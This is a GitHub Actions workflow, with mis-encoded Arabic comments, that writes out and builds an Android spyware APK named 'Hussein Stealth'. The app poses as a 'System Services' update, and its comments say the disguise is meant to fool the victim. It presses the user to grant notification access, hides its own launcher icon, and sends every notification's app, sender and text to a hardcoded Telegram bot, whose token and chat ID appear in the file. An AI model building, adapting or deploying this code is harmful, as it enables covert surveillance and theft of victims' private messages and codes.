name: Hussein Stealth Android Builder
on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: 1. Ø¥Ø¹Ø¯Ø§Ø¯ Ù„ØºØ© Ø¬Ø§ÙØ§
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: 2. Ø¨Ù†Ø§Ø¡ Ù‡ÙŠÙƒÙ„ Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ø£ØµÙ„ÙŠ
        run: |
          mkdir -p app/src/main/java/com/hussein/notifier
          mkdir -p app/src/main/res/layout

          cat << 'EOF' > settings.gradle
          rootProject.name = "HusseinNotifier"
          include ':app'
          EOF

          cat << 'EOF' > build.gradle
          buildscript {
              repositories {
                  google()
                  mavenCentral()
              }
              dependencies {
                  classpath 'com.android.tools.build:gradle:8.2.0'
              }
          }
          allprojects {
              repositories {
                  google()
                  mavenCentral()
              }
          }
          EOF

          cat << 'EOF' > app/build.gradle
          apply plugin: 'com.android.application'
          android {
              namespace 'com.hussein.notifier'
              compileSdkVersion 34
              defaultConfig {
                  applicationId "com.hussein.notifier"
                  minSdkVersion 24
                  targetSdkVersion 34
                  versionCode 1
                  versionName "1.0"
              }
              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_17
                  targetCompatibility JavaVersion.VERSION_17
              }
          }
          EOF

          # Ø§Ù„ØªÙ…ÙˆÙŠÙ‡: Ø§Ø³Ù… Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ ØµØ§Ø± "Ø®Ø¯Ù…Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…" Ù„Ù„ØªÙ…ÙˆÙŠÙ‡ Ø¹Ù„Ù‰ Ø§Ù„Ø¶Ø­ÙŠØ© Ø£Ùˆ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
          cat << 'EOF' > app/src/main/AndroidManifest.xml
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.INTERNET" />
              <application
                  android:allowBackup="true"
                  android:label="Ø®Ø¯Ù…Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…" 
                  android:theme="@android:style/Theme.Material.Light.NoActionBar">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  <service android:name=".MyNotificationListener"
                      android:label="ØªØ­Ø¯ÙŠØ« Ø®Ø¯Ù…Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…"
                      android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.service.notification.NotificationListenerService" />
                      </intent-filter>
                  </service>
              </application>
          </manifest>
          EOF

          # ÙˆØ§Ø¬Ù‡Ø© Ø¹Ø±Ø¨ÙŠØ© Ù…Ø±ØªØ¨Ø© ÙˆÙ…Ù‚Ù†Ø¹Ø©
          cat << 'EOF' > app/src/main/res/layout/activity_main.xml
          <?xml version="1.0" encoding="utf-8"?>
          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
              android:layout_width="match_parent"
              android:layout_height="match_parent"
              android:gravity="center"
              android:orientation="vertical"
              android:background="#F5F5F5"
              android:padding="30dp">
              <TextView
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="ØªØ­Ø¯ÙŠØ« Ø®Ø¯Ù…Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…"
                  android:textSize="24sp"
                  android:textColor="#333333"
                  android:textStyle="bold"
                  android:layout_marginBottom="10dp"/>
              <TextView
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="Ù…Ø±Ø­Ø¨Ø§Ù‹ØŒ Ù„Ø¶Ù…Ø§Ù† Ø¹Ù…Ù„ Ù‡Ø§ØªÙÙƒ Ø¨Ø´ÙƒÙ„ ØµØ­ÙŠØ­ ÙˆØ§Ø³ØªÙ‚Ø¨Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ØŒ ÙŠØ±Ø¬Ù‰ ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø®Ø¯Ù…Ø© Ù…Ù† Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª."
                  android:textSize="16sp"
                  android:textColor="#666666"
                  android:textAlignment="center"
                  android:layout_marginBottom="30dp"/>
              <Button
                  android:id="@+id/btn_permission"
                  android:layout_width="match_parent"
                  android:layout_height="60dp"
                  android:backgroundTint="#2196F3"
                  android:textColor="#FFFFFF"
                  android:textSize="18sp"
                  android:textStyle="bold"
                  android:text="ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø®Ø¯Ù…Ø© Ø§Ù„Ø¢Ù†"/>
          </LinearLayout>
          EOF

          # ÙƒÙˆØ¯ Ø§Ù„Ø¥Ø¬Ø¨Ø§Ø± ÙˆØ§Ù„ØªØ®ÙÙŠ (ÙŠØ®ÙÙŠ Ø§Ù„Ø£ÙŠÙ‚ÙˆÙ†Ø© Ø¨Ø¹Ø¯ Ø§Ù„ØªÙØ¹ÙŠÙ„)
          cat << 'EOF' > app/src/main/java/com/hussein/notifier/MainActivity.java
          package com.hussein.notifier;
          import android.app.Activity;
          import android.content.ComponentName;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.os.Bundle;
          import android.provider.Settings;
          import android.widget.Button;
          import android.widget.Toast;

          public class MainActivity extends Activity {
              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  setContentView(R.layout.activity_main);
                  Button btn = findViewById(R.id.btn_permission);
                  btn.setOnClickListener(v -> checkAndRequest());
              }

              @Override
              protected void onResume() {
                  super.onResume();
                  // Ø¥Ø°Ø§ ÙˆØ§ÙÙ‚ Ø¹Ù„Ù‰ Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ©ØŒ ÙŠØªÙ… Ø¥Ø®ÙØ§Ø¡ Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ ÙÙˆØ±Ø§Ù‹
                  if (isNotificationServiceEnabled()) {
                      hideAppIcon();
                      Toast.makeText(this, "ØªÙ… Ø§Ù„ØªØ­Ø¯ÙŠØ« Ø¨Ù†Ø¬Ø§Ø­ØŒ ÙŠÙ…ÙƒÙ†Ùƒ Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„Ø´Ø§Ø´Ø©.", Toast.LENGTH_LONG).show();
                      finish(); // Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ÙˆØ§Ø¬Ù‡Ø© Ù†Ù‡Ø§Ø¦ÙŠØ§Ù‹
                  }
              }

              private void checkAndRequest() {
                  if (!isNotificationServiceEnabled()) {
                      Toast.makeText(this, "âš ï¸ Ø¥Ø¬Ø±Ø§Ø¡ Ø¥Ø¬Ø¨Ø§Ø±ÙŠ: Ø§Ù„Ø±Ø¬Ø§Ø¡ ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø®Ø¯Ù…Ø© Ø£ÙˆÙ„Ø§Ù‹!", Toast.LENGTH_LONG).show();
                      startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
                  }
              }

              private boolean isNotificationServiceEnabled() {
                  String pkgName = getPackageName();
                  String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
                  return flat != null && flat.contains(pkgName);
              }

              // Ø¯Ø§Ù„Ø© Ø¥Ø®ÙØ§Ø¡ Ø§Ù„Ø£ÙŠÙ‚ÙˆÙ†Ø© Ù…Ù† Ø´Ø§Ø´Ø© Ø§Ù„Ù…ÙˆØ¨Ø§ÙŠÙ„
              private void hideAppIcon() {
                  PackageManager p = getPackageManager();
                  ComponentName componentName = new ComponentName(this, MainActivity.class);
                  p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
              }
          }
          EOF

          # ÙƒÙˆØ¯ Ø§Ù„Ø¥Ø´Ø¹Ø§Ø±Ø§Øª (Ø¥Ø±Ø³Ø§Ù„ Ù…Ø±ØªØ¨ Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù…)
          cat << 'EOF' > app/src/main/java/com/hussein/notifier/MyNotificationListener.java
          package com.hussein.notifier;
          import android.service.notification.NotificationListenerService;
          import android.service.notification.StatusBarNotification;
          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.net.URLEncoder;
          public class MyNotificationListener extends NotificationListenerService {
              
              
              private final String BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
              private final String CHAT_ID = "7392262688";
              
              @Override
              public void onNotificationPosted(StatusBarNotification sbn) {
                  if (sbn.getPackageName().equals("android")) return;
                  try {
                      String appName = sbn.getPackageName();
                      String title = sbn.getNotification().extras.getString("android.title");
                      CharSequence textChar = sbn.getNotification().extras.getCharSequence("android.text");
                      String text = textChar != null ? textChar.toString() : "Ø¨Ø¯ÙˆÙ† Ù†Øµ";
                      
                      String msg = "ğŸ¯ ØµÙŠØ¯Ø© Ø¬Ø¯ÙŠØ¯Ø© (Ø¥Ø´Ø¹Ø§Ø±)!\n" +
                                   "ğŸ“± Ø§Ù„ØªØ·Ø¨ÙŠÙ‚: " + appName + "\n" +
                                   "ğŸ‘¤ Ø§Ù„Ù…Ø±Ø³Ù„: " + title + "\n" +
                                   "ğŸ’¬ Ø§Ù„Ø±Ø³Ø§Ù„Ø©: " + text;
                      sendToTelegram(msg);
                  } catch (Exception e) {}
              }
              private void sendToTelegram(String message) {
                  new Thread(() -> {
                      try {
                          String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(message, "UTF-8");
                          HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
                          conn.setRequestMethod("GET");
                          conn.getInputStream();
                          conn.disconnect();
                      } catch (Exception e) {}
                  }).start();
              }
          }
          EOF

      - name: 3. Ø¥Ø¹Ø¯Ø§Ø¯ Ø£Ø¯Ø§Ø© Ø§Ù„Ø¨Ù†Ø§Ø¡
        uses: gradle/actions/setup-gradle@v3
        with:
          gradle-version: '8.5'

      - name: 4. ØªØ­ÙˆÙŠÙ„ Ø§Ù„ÙƒÙˆØ¯ Ø¥Ù„Ù‰ ØªØ·Ø¨ÙŠÙ‚ (APK)
        run: gradle assembleDebug

      - name: 5. Ø­ÙØ¸ Ø§Ù„Ù€ APK Ø§Ù„Ø¬Ø§Ù‡Ø²
        uses: actions/upload-artifact@v4
        with:
          name: Hussein-Stealth-App
          path: app/build/outputs/apk/debug/*.apk
